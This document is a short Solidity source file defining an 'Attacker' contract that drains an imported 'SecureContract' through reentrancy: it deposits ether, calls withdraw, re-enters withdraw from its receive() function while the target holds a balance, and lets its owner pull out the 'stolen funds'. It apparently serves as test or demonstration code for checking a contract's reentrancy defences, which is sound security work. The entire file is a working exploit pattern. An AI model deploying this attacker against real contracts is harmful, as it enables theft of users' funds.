// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./SecureContract.sol";

contract Attacker {
    SecureContract public targetContract;
    address public owner;

    constructor(address _target) {
        targetContract = SecureContract(_target);
        owner = msg.sender;
    }

    // Receive Ether function for reentrancy attack
    receive() external payable {
        if (address(targetContract).balance > 0) {
            targetContract.withdraw();
        }
    }

    // Attack function to trigger reentrancy
    function attack() external payable {
        require(msg.value > 0, "Must send some ether");
        targetContract.deposit{value: msg.value}();
        targetContract.withdraw();
    }

    // Withdraw stolen funds
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
